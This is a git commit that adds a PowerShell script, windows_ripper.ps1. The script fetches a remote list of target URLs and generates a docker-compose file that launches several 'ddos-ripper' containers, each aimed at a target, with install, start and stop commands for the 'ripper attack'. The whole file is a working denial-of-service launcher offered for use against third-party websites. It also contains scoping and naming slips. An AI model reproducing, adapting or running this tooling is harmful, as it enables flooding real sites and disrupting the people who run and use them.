4ca3b5c1db8e7d66cad23fde599d76bc74c454a4
SaharaLacey <100581737+SaharaLacey@users.noreply.github.com>
2022-02-28 14:27:16 +0200

    Add powershell script for windows

---
+++ windows_ripper.ps1
@@ -0,0 +1,105 @@
+param ($Action, $Number=10, $Force=$false)
+# Stop script if fail by default
+$ErrorActionPreference = "Stop"
+# Ripper shell v2.1
+# 1.0 - initial script (uses local urls.txt file)
+# 2.0 - added external mirror for url list
+# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)
+
+
+$VERSION = '2.1'
+$TARGETS_URL = 'https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+$TARGETS_URL_BACKUP = 'https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'
+
+
+function Print-Help {
+    Write-Host "Usage: wibdows_ripper.sh -Action install [-Number 10]"
+    Write-Host "-Action (install, start, stop)"
+    Write-Host "        install - first run or to update targets"
+    Write-Host "        stop - stop attack"
+    Write-Host "        start - resume attack"
+    Write-Host "-Number - number of containers to start, if not used then 10 used"
+}
+
+
+function Print-Version {
+    Write-Host $VERSION
+}
+
+
+function Check-Dependencies {
+    if ( -not $(docker -v) ) {
+        Write-Host "Please install docker first. https://www.docker.com/products/docker-desktop"
+        exit 1
+    }
+}
+
+
+function Get-Targets {
+    $Result = Invoke-WebRequest -Uri $TARGETS_URL -OutFile targets.txt
+    if ( $Result ) {
+        $URLS =  Get-Content targets.txt
+    } else {
+        Invoke-WebRequest -Uri $TARGETS_URL_BACKUP -OutFile targets.json
+        $URLS =  Get-Content targets.JSON | ConvertFrom-Json
+    }
+}
+
+
+function Generate-Compose {
+    Remove-Item -Path docker-compose.yml
+    Add-Content -Path docker-compose.yml -Value "version: '3'"
+    Add-Content -Path docker-compose.yml -Value "services:"
+    for ( $i=1; $i -le $Number; $i++ ) {
+        $LineID = Get-Random -Maximum $URLS.Length
+        $Line = $URLS[$LineID]
+        Add-Content -Path docker-compose.yml -Value "  ddos-runner-${i}:"
+        Add-Content -Path docker-compose.yml -Value "    image: nitupkcuf/ddos-ripper:latest"
+        Add-Content -Path docker-compose.yml -Value "    restart: always"
+        Add-Content -Path docker-compose.yml -Value "    command: ${Line}"
+    }
+}
+
+
+function Ripper-Start {
+  Write-Host "Starting ripper attack"
+  docker-compose up -d
+}
+
+
+function Ripper-Stop {
+    Write-Host "Stopping ripper attack"
+    if ( docker-compose ls -q ) {
+        docker-compose down
+    }
+    if ( $Force ) {
+        try {
+            $(docker rm -f $(docker ps -a -q))
+        } catch {
+            "Nothing to stop"
+        }
+    }
+}
+
+
+Check-Dependencies
+
+if ( -not $Action ) {
+    Print-Help
+    exit 0
+} elseif ( $Action -eq "install" ) {
+    Ripper-Stop
+    Get-Targets
+    Generate-Compose
+    Ripper-Start
+    exit 0
+} elseif ( $Action -eq "start" ) {
+    Ripper-Start
+    exit 0
+} elseif ( $Action -eq "stop" ) {
+    Ripper-Stop
+    exit 0
+}
+
+Print-Help
+exit 1
